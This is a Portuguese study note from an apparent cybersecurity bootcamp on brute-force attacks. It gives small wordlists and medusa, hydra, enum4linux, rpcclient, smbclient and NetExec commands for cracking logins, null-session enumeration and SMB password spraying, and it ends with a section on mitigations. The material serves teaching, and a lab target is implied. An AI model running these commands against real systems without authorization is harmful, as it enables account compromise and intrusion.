# Estudos sobre ataques de força bruta

Para começar o aprendizado de ataques de força bruta é de traste escolher uma lista de palavras, tanto para usuários quanto para senhas.
No caso do bootcamp foi optado por fazer uso de uma lista personalizada:

```bash
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

```bash
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```
Poderia tambem ser usados listas do SecLists ou rockyou.

Com as listas escolhidas podemos executar o comando do medusa:

```
medusa -h <target_ip> -U users.txt -P pass.txt -M <attack_method> -t <threads>
```
Lembrando que podem ser trocados as listas de usuarios e senhas.

## Força bruta para Web
É Tambem possivel fazer ataques de força bruta para logins de paginas web. Uma ferramenta muito comum para atacar wordpress, por exemplo, é o wpscan que alem de identificar informações como versão e plugins instalados tem funcionalidades para ataque de força bruta. O medusa também pode ser usado para fazer esse tipo de ataque:

```bash
medusa -h <target_ip> -U users.txt -P pass.txt -M http \
-m PAGE:'/target/endpoint' \
-m FORM 'username=^USER^&password^PASS^&Login=login' \
-m 'FAIL=Login failed'
```

Tambem podemos usar o hydra dessa maneira:

```bash
hydra -L users.txt -P pass.txt -f IP http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

## Enumerando usuários
Como mostrado no curso uma opção para mapear o ambiente é usar o comando `enum4linux` da seguinte  maneira:

```bash
enum4linux -a <ip> | tee out.txt
```
Mas para ter um controle a mais do fingerprint sendo feito podemos usar comando como:

```
rpcclient -U "" <ip> -c "enumdomusers"
```
Esse comando irá testar para uma configuração incorreta do RPC, que é a null user login. Depois disso executamos o comando `enumdomusers` que mapeia os usuários presente naquela forest.

Outro null user login bem comum em serviços de windows é no SMB:

```
smbclient -N -L \\<ip>\
```
isso irá também testar null login para smb e irá listar as shares que aquele usuário tem acesso. Depois de mapear as shares, para interagir com o SMB basta retirar a flag `-L` e especificar a share ao fim do ip.

Utilizando também os usuários retirados do RPC, é possivel criar uma lista de usuários e assim usa-la para um brute force, em busca de encontrar uma senha valida.

É bem comum usar o `NetExec` ou `CrackMapExec` para mapear usuários presentes em protocolos como SMB ou LDAP.

```
nxc smb <ip> -u users.txt -p pass.txt --continue-on-success
```

Depois de achar um usuários valido, podemos logar e ver suas shares com smbclient:

 ```
 smbclient -L -U <username> \\<ip>
 ```
 Apos ver as shares disponiveis, podemos interagir com elas retirando a flag `-L`

# Mitigação
Para cibersegurança é sempre importante pensar em como os ataques podem ser evitados. No caso de ataques de força bruta é importante lembrar que senhas fracas são ruins. Então a um nível de usuário se preocupar para não usar senhas fracas e obvias é uma medida de segurança. Vale lembrar que senhas relacionadas a vida pessoal também não são recomendadas, pois uma análise de forensics de um atacante pode levar a derivação da senha por essas informações. A nível de um gestor é possivel implementar coisas como password policies e lembrar os funcionários de trocar suas senhas após um certo periodo de tempo.

Além disso a nível de sistema bloquear um IP de fazer requisições em massa, ou requisições que parecem perigosas, é uma medida de segurança. Uso de EDRs para verificar essas ações perigosas é recomendado, e em combinação com um SIEM ou SOAR pode elevar o nível de segurança da empresa.
